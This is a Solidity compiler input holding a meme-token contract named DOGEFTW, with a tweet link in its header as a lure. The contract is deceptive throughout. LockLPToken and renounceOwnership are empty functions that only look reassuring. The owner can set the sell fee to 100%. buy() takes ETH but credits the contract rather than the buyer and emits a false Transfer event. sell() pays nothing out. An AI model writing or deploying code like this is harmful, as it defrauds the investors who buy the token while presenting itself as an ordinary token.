{{
  "language": "Solidity",
  "sources": {
    "1.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\n/**    \r\nhttps://twitter.com/elonmusk/status/1666080505908039680\r\n\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"Subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"Addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"Multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"Division by zero\");\r\n        return a / b;\r\n    }\r\n}\r\n\r\ncontract DOGEFTW {\r\n    using SafeMath for uint256;\r\n\r\n    string public name = \"DOGEFTW\";\r\n    string public symbol = \"DOGEFTW\";\r\n    uint256 public totalSupply = 999999999999999999000000000;\r\n    uint8 public decimals = 18;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    address public owner;\r\n\r\n    uint256 public buyFee;\r\n    uint256 public sellFee;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);\r\n    event TokensBurned(address indexed burner, uint256 amount);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function transfer(address _to, uint256 _amount) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= _amount);\r\n        require(_to != address(0));\r\n\r\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n        balanceOf[_to] = balanceOf[_to].add(_amount);\r\n        emit Transfer(msg.sender, _to, _amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function LockLPToken() public onlyOwner {\r\n\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\r\n        require(balanceOf[_from] >= _amount, \"Insufficient balance\");\r\n        require(allowance[_from][msg.sender] >= _amount, \"Insufficient allowance\");\r\n        require(_to != address(0), \"Invalid recipient address\");\r\n\r\n        uint256 fee = 0;\r\n        uint256 amountAfterFee = _amount;\r\n\r\n        if (sellFee > 0) {\r\n            fee = _amount.mul(sellFee).div(100);\r\n            amountAfterFee = _amount.sub(fee);\r\n        }\r\n\r\n        balanceOf[_from] = balanceOf[_from].sub(_amount);\r\n        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);\r\n        emit Transfer(_from, _to, amountAfterFee);\r\n\r\n        if (fee > 0) {\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n            emit Transfer(_from, address(this), fee);\r\n        }\r\n\r\n        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {\r\n            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);\r\n            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n   function renounceOwnership() public onlyOwner {\r\n\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only the owner can call this function.\");\r\n        _;\r\n    }\r\n\r\n    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {\r\n        require(newBuyFee <= 100, \"Buy fee cannot exceed 100%\");\r\n        require(newSellFee <= 100, \"Sell fee cannot exceed 100%\");\r\n        buyFee = newBuyFee;\r\n        sellFee = newSellFee;\r\n        emit FeesUpdated(newBuyFee, newSellFee);\r\n    }\r\n\r\n    function buy() public payable {\r\n        require(msg.value > 0, \"ETH amount should be greater than 0\");\r\n\r\n        uint256 amount = msg.value;\r\n        if (buyFee > 0) {\r\n            uint256 fee = amount.mul(buyFee).div(100);\r\n            uint256 amountAfterFee = amount.sub(fee);\r\n\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);\r\n            emit Transfer(address(this), msg.sender, amountAfterFee);\r\n\r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n                emit Transfer(address(this), address(this), fee);\r\n            }\r\n        } else {\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(amount);\r\n            emit Transfer(address(this), msg.sender, amount);\r\n        }\r\n    }\r\n\r\n    function sell(uint256 _amount) public {\r\n        require(balanceOf[msg.sender] >= _amount, \"Insufficient balance\");\r\n\r\n        if (sellFee > 0) {\r\n            uint256 fee = _amount.mul(sellFee).div(100);\r\n            uint256 amountAfterFee = _amount.sub(fee);\r\n\r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);\r\n            emit Transfer(msg.sender, address(this), amountAfterFee);\r\n\r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n                emit Transfer(msg.sender, address(this), fee);\r\n            }\r\n        } else {\r\n            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(_amount);\r\n            emit Transfer(msg.sender, address(this), _amount);\r\n        }\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}